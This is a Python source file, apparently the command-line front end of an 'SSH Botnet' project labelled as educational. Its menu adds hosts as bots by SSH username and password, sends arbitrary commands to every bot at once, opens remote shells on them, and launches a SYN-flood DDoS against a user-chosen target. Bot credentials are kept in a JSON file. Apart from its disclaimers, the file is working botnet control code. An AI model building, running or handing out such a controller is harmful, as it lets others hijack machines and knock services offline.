#!/usr/bin/env python3
"""
SSH Botnet - Main CLI Interface

DISCLAIMER: This project is for educational and ethical hacking purposes only.
Unauthorized access to systems without consent is illegal and violates cybersecurity laws.
Always obtain permission before testing these techniques on any system.
"""

import sys
import os

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from botnet import Botnet


def print_banner():
    """Print the application banner."""
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║           SSH BOTNET - EDUCATIONAL PROJECT                ║
    ║                                                           ║
    ║  DISCLAIMER: For educational purposes only!               ║
    ║  Unauthorized access to systems is illegal!               ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)


def print_menu():
    """Print the main menu."""
    menu = """
    [1] List Bots              - View all connected SSH bots
    [2] Execute Command        - Send command to all bots
    [3] Interactive Shell      - Real-time bash shell on bots
    [4] Add Bot                - Add new SSH client to botnet
    [5] DDoS Attack            - Simulate SYN flood attack
    [6] Save Botnet            - Save bot configuration to JSON
    [7] Load Botnet            - Load bots from JSON file
    [8] Remove Bot             - Remove a specific bot
    [9] Disconnect All         - Disconnect all bots and exit
    
    [0] Exit
    """
    print(menu)


def get_user_choice() -> str:
    """Get user menu choice."""
    try:
        choice = input("Select option [0-9]: ").strip()
        return choice
    except KeyboardInterrupt:
        return '0'


def add_bot_interactive(botnet: Botnet):
    """Interactive prompt to add a new bot."""
    print("\n--- Add New Bot ---")
    
    try:
        host = input("Enter host (IP/hostname): ").strip()
        if not host:
            print("[-] Host cannot be empty.")
            return
        
        username = input("Enter username: ").strip()
        if not username:
            print("[-] Username cannot be empty.")
            return
        
        password = input("Enter password: ").strip()
        if not password:
            print("[-] Password cannot be empty.")
            return
        
        print(f"\n[*] Connecting to {host}...")
        botnet.add_bot(host, username, password)
        
    except KeyboardInterrupt:
        print("\n[*] Cancelled.")
    except Exception as e:
        print(f"[-] Error: {str(e)}")


def execute_command_interactive(botnet: Botnet):
    """Interactive prompt to execute command on all bots."""
    if not botnet.bots:
        print("[-] No bots connected. Add bots first.")
        return
    
    print("\n--- Execute Command ---")
    command = input("Enter command to execute: ").strip()
    
    if command:
        botnet.send_command(command)
    else:
        print("[-] Command cannot be empty.")


def ddos_attack_interactive(botnet: Botnet):
    """Interactive prompt to launch DDoS attack."""
    if not botnet.bots:
        print("[-] No bots available. Add bots first.")
        return
    
    print("\n--- DDoS Attack (SYN Flood) ---")
    print("WARNING: Only use on systems you own or have permission to test!")
    
    try:
        target = input("Enter target IP: ").strip()
        if not target:
            print("[-] Target cannot be empty.")
            return
        
        port_input = input("Enter target port [default: 80]: ").strip()
        port = int(port_input) if port_input else 80
        
        duration_input = input("Enter duration in seconds [default: 60]: ").strip()
        duration = int(duration_input) if duration_input else 60
        
        threads_input = input("Enter number of threads per bot [default: 10]: ").strip()
        threads = int(threads_input) if threads_input else 10
        
        botnet.ddos_attack(target, port, duration, threads)
        
    except ValueError:
        print("[-] Invalid number entered.")
    except KeyboardInterrupt:
        print("\n[*] Cancelled.")
    except Exception as e:
        print(f"[-] Error: {str(e)}")


def save_botnet_interactive(botnet: Botnet):
    """Interactive prompt to save botnet."""
    if not botnet.bots:
        print("[-] No bots to save.")
        return
    
    filename = input("Enter filename [default: botnet.json]: ").strip()
    if not filename:
        filename = "botnet.json"
    
    botnet.save_botnet(filename)


def load_botnet_interactive(botnet: Botnet):
    """Interactive prompt to load botnet."""
    filename = input("Enter filename [default: botnet.json]: ").strip()
    if not filename:
        filename = "botnet.json"
    
    botnet.load_botnet(filename)


def remove_bot_interactive(botnet: Botnet):
    """Interactive prompt to remove a bot."""
    if not botnet.bots:
        print("[-] No bots to remove.")
        return
    
    botnet.list_bots()
    
    try:
        index_input = input("Enter bot number to remove: ").strip()
        index = int(index_input) - 1  # Convert to 0-based index
        
        botnet.remove_bot(index)
        
    except ValueError:
        print("[-] Invalid number entered.")
    except Exception as e:
        print(f"[-] Error: {str(e)}")


def main():
    """Main application loop."""
    print_banner()
    
    botnet = Botnet()
    
    # Try to load existing botnet on startup
    if os.path.exists("botnet.json"):
        print("[*] Found existing botnet.json. Loading...")
        botnet.load_botnet("botnet.json")
    
    while True:
        print_menu()
        choice = get_user_choice()
        
        if choice == '0':
            print("\n[*] Exiting...")
            botnet.disconnect_all()
            print("[+] Goodbye!")
            break
            
        elif choice == '1':
            botnet.list_bots()
            
        elif choice == '2':
            execute_command_interactive(botnet)
            
        elif choice == '3':
            botnet.interactive_shell()
            
        elif choice == '4':
            add_bot_interactive(botnet)
            
        elif choice == '5':
            ddos_attack_interactive(botnet)
            
        elif choice == '6':
            save_botnet_interactive(botnet)
            
        elif choice == '7':
            load_botnet_interactive(botnet)
            
        elif choice == '8':
            remove_bot_interactive(botnet)
            
        elif choice == '9':
            botnet.disconnect_all()
            
        else:
            print("[-] Invalid option. Please select 0-9.")
        
        input("\nPress Enter to continue...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Fatal error: {str(e)}")
        sys.exit(1)
